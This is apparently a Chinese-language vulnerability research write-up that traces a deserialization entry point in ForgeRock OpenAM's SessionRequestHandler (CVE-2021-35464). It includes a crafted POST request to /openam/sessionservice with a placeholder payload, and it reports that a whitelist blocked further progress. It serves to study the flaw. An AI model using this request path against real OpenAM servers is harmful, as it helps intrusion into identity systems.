[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0161b71c5cc5fe8d00.png)

通过审计SessionRequestHandler发现有一处触发点，并且在之前未发现有校验，那么剩下的问题就转变成如何调用这个Handler进行处理。

[![](https://p2.ssl.qhimg.com/t011b46e93e0c7b6589.png)](https://p2.ssl.qhimg.com/t011b46e93e0c7b6589.png)

在之前分析servlet函数的时候有分析到pllservice

[![](https://p1.ssl.qhimg.com/t018f861f3415a28243.png)](https://p1.ssl.qhimg.com/t018f861f3415a28243.png)

它里面的请求包处理函数和Handler调用有着一定的联系，粗略看来和xml解析有关，具体什么关系还是需要动态调试才能确定。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0138ec93703be4ad34.png)

### <a class="reference-link" name="0x3%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%8C%85"></a>0x3 动态调试确定数据包

通过动态调试找到了获取handler的关键代码，如下图所示。set.geteServiceID就是post数据中xml里的svcid值，我们可以控制。

[![](https://p0.ssl.qhimg.com/t01fec2b4533727b40b.png)](https://p0.ssl.qhimg.com/t01fec2b4533727b40b.png)

最为核心的代码在getServiceHandler函数中，通过分析发现requestHandlers为已经加载的Handler，这个机制和ViewBean很相似。handler的生成在第150行进行，但之前要获得handler的名称，这个操作主要在WebtopNaming.getServiceClass中进行。

[![](https://p0.ssl.qhimg.com/t01e80f73a5687746cb.png)](https://p0.ssl.qhimg.com/t01e80f73a5687746cb.png)

getServiceClass函数是在config中寻找与之匹配的项，config中保存了所有的映射关系。

[![](https://p2.ssl.qhimg.com/t01d7e367a352e7dbdc.png)](https://p2.ssl.qhimg.com/t01d7e367a352e7dbdc.png)

映射关系如下，通过这个NamingTable可以很直观的找到svcid为session时与之对应的handler为SessionRequestHandler。因此我们构造数据包也就有了着落。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013fd0fb758e69192e.png)

### <a class="reference-link" name="0x4%20%E5%A1%AB%E5%85%85%E5%8F%82%E6%95%B0"></a>0x4 填充参数

找到Handler的生成关系后，我们需要将反序列化的数据填充进去，这里主要是确定getRequester获取的是什么数据。

[![](https://p4.ssl.qhimg.com/t01bf1198ea1a1de0bc.png)](https://p4.ssl.qhimg.com/t01bf1198ea1a1de0bc.png)

跟进发现该数据已经生成完毕了，我们需要做的是溯源路由，找到填充变量的那块代码。

[![](https://p5.ssl.qhimg.com/t019e41877eb97f9ee2.png)](https://p5.ssl.qhimg.com/t019e41877eb97f9ee2.png)

通过简单的分析发现了在xml解析时，解析了elem的requester属性，如果该属性存在则赋值。

[![](https://p4.ssl.qhimg.com/t01cd7d3213fa22a13a.png)](https://p4.ssl.qhimg.com/t01cd7d3213fa22a13a.png)

那么剩下的就简单了，构造一个符合代码的xml数据包发送给后台。这里需要注意的是requester参数里的内容要经历两次base64编码。

```
POST /openam/sessionservice HTTP/1.1
Host: 192.168.0.201
Connection: close
sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 5156

&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;RequestSet vers="1.0" svcid="session" reqid="0"&gt;&lt;Request&gt;&lt;![CDATA[&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Subject requester="data"&gt;&lt;requester&gt;xxxx&lt;/requester&gt;&lt;/Subject&gt;]]&gt;&lt;/Request&gt;&lt;/RequestSet&gt;

```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013bdfe45cf246371b.png)

成功到达反序列化的地方，可是存在严格的白名单，目前没有什么好的办法。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0175bb383316706ef6.png)



## 0x07 总结

本文主要从如何挖掘该漏洞的角度分析这个漏洞的挖掘方式，后面将会用重点介绍这个漏洞利用方式。



## 参考文章

[https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
